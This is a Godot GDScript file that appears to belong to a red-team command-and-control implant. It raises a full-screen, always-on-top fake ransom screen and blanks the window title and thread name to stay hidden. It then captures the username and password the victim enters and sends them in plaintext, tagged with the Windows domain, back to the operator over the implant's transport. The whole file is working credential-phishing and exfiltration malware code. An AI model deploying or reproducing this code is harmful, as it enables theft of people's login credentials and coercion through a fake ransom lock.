extends Node

var display_size
var gui
var task_id

func _ready():
	display_size = Vector2(1024,768)
	gui = $".".get_node("RansomGUI")
	hide()

func show():
	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")
	var screen_size = DisplayServer.screen_get_size(0)

	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_WINDOWED)
	DisplayServer.window_set_position(Vector2i(0,0), 0)
	DisplayServer.window_set_size(screen_size, 0)

	DisplayServer.window_set_exclusive(0, true)
	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_ALWAYS_ON_TOP, true, 0)
	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_BORDERLESS, true, 0)
	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_NO_FOCUS, true, 0)
	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_TRANSPARENT, true, 0)
	gui.get_node("ColorRect").custom_minimum_size = Vector2(screen_size.x+screen_size.x/2, screen_size.y+screen_size.y/2)
	
	gui.position = screen_size*0.5 - display_size*0.75

	gui.show()
	gui.visible = true


func hide():
	gui.hide()

	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_MINIMIZED)
	DisplayServer.window_set_size(Vector2i(0,0), 0)

	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")
	get_window().size = Vector2(1,1)
	gui.position = Vector2(-1,-1)

	gui.reset()

func _on_tasking_ransom(transport, task):

	show()
	task_id = task.get("id")
	
	transport.send(
		transport.create_task_response(
			true,
			false,
			task_id,
			"ransom screen displayed",
			[], #TODO: any artifact id we can use to track that a ransom screen was shown to the user?
			[]
		)
	)

func _on_ransom_gui_verify_username_password(transport, username, password):
	hide() # TODO: or just keep it up until the redteam member decides it should go away?
	
	var realm = "UNKNOWN REALM"

	if OS.has_environment("USERDOMAIN"):
		realm = OS.get_environment("USERDOMAIN")

	transport.send(
		transport.create_task_response(
			true,
			true,
			task_id,
			"ransom screen collected credentials",
			[],
			[
				{
					"comment": "untrusted credential source (ransom screen)",
					"credential_type": "plaintext",
					"realm": realm,
					"credential": password,
					"account": username,
				}
			]
		)
	)
